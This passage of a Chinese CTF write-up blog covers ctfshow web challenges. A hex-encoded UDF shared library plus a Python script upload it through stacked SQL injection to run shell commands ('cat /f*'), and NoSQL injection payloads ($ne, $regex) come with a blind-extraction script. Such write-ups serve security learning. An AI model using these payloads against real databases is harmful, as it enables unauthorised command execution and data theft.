2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000&quot;</span></span><br><span class="line">udfs=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(udf),<span class="number">5000</span>):</span><br><span class="line">    udfs.append(udf[i:i+<span class="number">5000</span>])</span><br><span class="line"><span class="comment">#写入多个文件中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> udfs:</span><br><span class="line">    url1=url+<span class="string">f&quot;?id=1&#x27;;SELECT &#x27;<span class="subst">&#123;i&#125;</span>&#x27; into dumpfile &#x27;/tmp/&quot;</span>+<span class="built_in">str</span>(udfs.index(i))+<span class="string">&quot;.txt&#x27;%23&quot;</span></span><br><span class="line">    requests.get(url1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#合并文件生成so文件</span></span><br><span class="line">url2=url+<span class="string">&quot;?id=1&#x27;;SELECT unhex(concat(load_file(&#x27;/tmp/0.txt&#x27;),load_file(&#x27;/tmp/1.txt&#x27;),load_file(&#x27;/tmp/2.txt&#x27;),load_file(&#x27;/tmp/3.txt&#x27;))) into dumpfile &#x27;/usr/lib/mariadb/plugin/hack.so&#x27;%23&quot;</span></span><br><span class="line">requests.get(url2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建自定义函数并执行恶意命令</span></span><br><span class="line">requests.get(url+<span class="string">&quot;?id=1&#x27;;create function sys_eval returns string soname &#x27;hack.so&#x27;%23&quot;</span>)</span><br><span class="line">r=requests.get(url+<span class="string">&quot;?id=1&#x27;;select sys_eval(&#x27;cat /f*&#x27;)%23&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单解释一下：</p>
<p>脚本里面<code>udf</code>参数的值就是我们要往<code>.so</code>文件写入的内容，但是这里因为get传参对数据长度有限制，所以不能一口气传这么多。所以这里采用了切片的方式，把整个udf切成几个txt文件，然后最后再通过 concat(load_file(“1.txt”),load_file(“2.txt”),load_file(“3.txt”))，这样的方式来写入到<code>.so</code>里面。最后在通过调用的语法去调用：<code>create function sys_eval return string soname &#39;hack.so&#39;;select sys_eval(&#39;cat /f*&#39;);</code>来执行命令。</p>
<p>一开始的切片是写入到了<code>/tmp</code>目录下面，这个目录一般来说有写权限。</p>
<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user = $memcache-&gt;get($id);</span><br></pre></td></tr></table></figure>

<p>也告诉了<code>flag</code>在<code>flag</code>里面，其实就是查询flag健对应的值。这里直接传<code>?id=flag</code>会返回<code>error</code>，这里怀疑可能有<code>intval</code>校验，可以用数组绕过：<code>payload:?id[]=flag</code></p>
<h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><p>考察的基础的<code>nosql注入</code></p>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = new MongoDB\Driver\Query($data);</span><br><span class="line">$cursor = $manager-&gt;executeQuery(&#x27;ctfshow.ctfshow_user&#x27;, $query)-&gt;toArray();</span><br><span class="line">返回逻辑：</span><br><span class="line">  //无过滤</span><br><span class="line">if(count($cursor)&gt;0)&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">  array_push($ret[&#x27;data&#x27;], $flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>SQL术语&#x2F;概念</th>
<th>MongoDB术语&#x2F;概念</th>
<th>解释&#x2F;说明</th>
</tr>
</thead>
<tbody><tr>
<td>database</td>
<td>database</td>
<td>数据库</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>数据库表&#x2F;集合</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>数据记录行&#x2F;文档</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>数据字段&#x2F;域</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>操作</th>
<th>格式</th>
<th>范例</th>
<th>RDBMS中的类似语句</th>
</tr>
</thead>
<tbody><tr>
<td>小于</td>
<td>{:{$lt:}}</td>
<td>db.userinfo.find({“age”:{$lt:20}})</td>
<td>where age &lt; 20</td>
</tr>
<tr>
<td>小于或等于</td>
<td>{:{$lte:}}</td>
<td>db.userinfo.find({“age”:{$lte:20}})</td>
<td>where age &lt;&#x3D; 20</td>
</tr>
<tr>
<td>大于</td>
<td>{:{$gt:}}</td>
<td>db.userinfo.find({“age”:{$gt:20}})</td>
<td>where age &gt; 20</td>
</tr>
<tr>
<td>大于或等于</td>
<td>{:{$gte:}}</td>
<td>db.userinfo.find({“age”:{$gte:20}})</td>
<td>where age &gt;&#x3D; 20</td>
</tr>
<tr>
<td>不等于</td>
<td>{:{$ne:}}</td>
<td>db.userinfo.find({“likes”:{$ne:20}})</td>
<td>where age !&#x3D; 20</td>
</tr>
</tbody></table>
<p>nosql里面传数据支持json格式，比如传<code>username[$ne]=1</code>，等效于:<code>&#123;&quot;username&quot;:&#123;&quot;ne&quot;:1&#125;&#125;</code>，相当于<code>where username!=1</code> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">AND 查询</span><br><span class="line">db.userinfo.find(&#123;key1:value1, key2:value2&#125;)</span><br><span class="line"></span><br><span class="line">OR 查询</span><br><span class="line">db.userinfo.find(&#123;$or: [&#123;key1: value1&#125;, &#123;key2:value2&#125;]&#125;)</span><br><span class="line"></span><br><span class="line">db.userinfo.find(&#123;name:&#x27;yu22x&#x27;&#125;);</span><br><span class="line">where username=&#x27;yu22x&#x27;</span><br><span class="line"></span><br><span class="line">db.userinfo.find(&#123;&quot;likes&quot;:&#123;$ne:20&#125;&#125;)</span><br><span class="line">where likes != 20</span><br><span class="line"></span><br><span class="line">显式创建集合</span><br><span class="line">db.createCollection(&quot;userinfo&quot;);//创建一个名为usersinfo的集合</span><br><span class="line"></span><br><span class="line">隐式创建集合</span><br><span class="line">db.userinfo.insert(&#123;name:&quot;yu22x&quot;&#125;);//往collection2集合中添加数据来创建集合，如果集合不存在就自动创建集合。</span><br><span class="line"></span><br><span class="line">查看集合</span><br><span class="line">show collections;//(show tables)</span><br><span class="line"></span><br><span class="line">删除集合userinfo</span><br><span class="line">db.userinfo.drop();</span><br><span class="line"></span><br><span class="line">注：mongo中支持js，可通过js操作实现批零处理，如：for(var i=0;i&lt;1000;i++)&#123;db.userinfo.insert(&#123;name:&quot;xiaomu&quot;+i,age:20+i&#125;);&#125;</span><br><span class="line">固定集合</span><br></pre></td></tr></table></figure>

<p>最终的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://6071a04f-e0c2-4bb2-9ab0-2896eecb14f9.challenge.ctf.show/api/index.php</span><br><span class="line">POST:</span><br><span class="line">username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><p>原理和上面是差不多的，payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://6071a04f-e0c2-4bb2-9ab0-2896eecb14f9.challenge.ctf.show/api/index.php</span><br><span class="line">POST:</span><br><span class="line">username[$ne]=admin&amp;password[$ne]=1</span><br></pre></td></tr></table></figure>

<h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://6071a04f-e0c2-4bb2-9ab0-2896eecb14f9.challenge.ctf.show/api/index.php</span><br><span class="line">POST:</span><br><span class="line">username[$ne]=1&amp;password[$regex]=^ctfshow&#123;</span><br></pre></td></tr></table></figure>

<h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>这个题一开始传<code>username[$ne]=1&amp;password[$ne]=1</code>，可以查询到登录诚哥，但是没回显。可以判断是盲注。所以可以用到我们上一个题目的<code>$regex</code>来去盲注匹配。</p>
<p><code>username[$ne]=1&amp;password[$regex]=^ctfshoa和username[$ne]=1&amp;password[$regex]=^ctfshow</code>，一个返回查询成功，一个返回查询失败，根据这个我们可以来写脚本盲注：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://0a77a93f-cfea-4884-98b6-81147fe93eef.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">dicts=<span class="string">&quot;0123456789-&#123;&#125;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flags=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dicts:</span><br><span class="line">        payload=<span class="string">&quot;^&#123;&#125;&quot;</span>.<span class="built_in">format</span>(flags+j)</span><br><span class="line">        data=&#123;<span class="string">&quot;username[$ne]&quot;</span>:<span class="number">1</span>,<span class="string">&quot;password[$regex]&quot;</span>:payload&#125;</span><br><span class="line">        res=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;登陆成功&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flags=flags+j</span><br><span class="line">            <span class="built_in">print</span>(flags)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flags)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>到这里CTFshow的SQL注入算是重新又看了一遍，当然路还有很长。后面会把SQL注入的题目依然往这里头去更新。时常复习回看。</p>
<p>​			<br>​			<br>​			<br>​			<br>​		</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/10/06/misc%E5%A4%8D%E7%8E%B0/" rel="prev" title="misc复现">
                  <i class="fa fa-angle-left"></i> misc复现
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/10/21/2024%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="next" title="2024集团网络安全攻防赛决赛复现">
                  2024集团网络安全攻防赛决赛复现 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">My0n9s</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
